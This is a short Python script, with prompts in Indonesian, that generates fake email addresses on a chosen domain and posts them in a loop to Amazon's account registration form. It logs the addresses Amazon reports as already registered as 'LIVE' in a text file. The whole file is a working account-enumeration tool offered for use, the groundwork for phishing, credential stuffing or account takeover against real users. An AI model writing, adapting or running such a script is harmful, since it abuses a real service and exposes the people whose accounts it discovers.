import requests
from faker import Faker
from random import randint
import datetime

fake = Faker()
now = datetime.datetime.now()
domain = str(input('Domainya mau apa? :'))
live = open('LiveAuto'+now.strftime("%Y-%m-%d %H:%M:%S")+'.txt', 'w')

link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head) 


print("-"*55)
while True:
    # remove space fake.name()
    name = fake.name().replace(" ", "")
    random_number = str(randint(0,31))
    email=name+random_number+'@'+domain
    xxx = {'customerName':'Casein Nitrate','email': email,'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
    cek = s.post(link, headers=head, data=xxx).text #add verify=False to use a self signed certificate
    if "You indicated you're a new customer, but an account already exists with the email address" in cek:
        print("\033[32;1mLIVE\033[0m | "+email+" | [("+now.strftime("%Y-%m-%d %H:%M:%S")+")]")
        live.write(email + '\n')
    else:
        print("\033[31;1mDIE\033[0m | "+email+" | [("+now.strftime("%Y-%m-%d %H:%M:%S")+")]")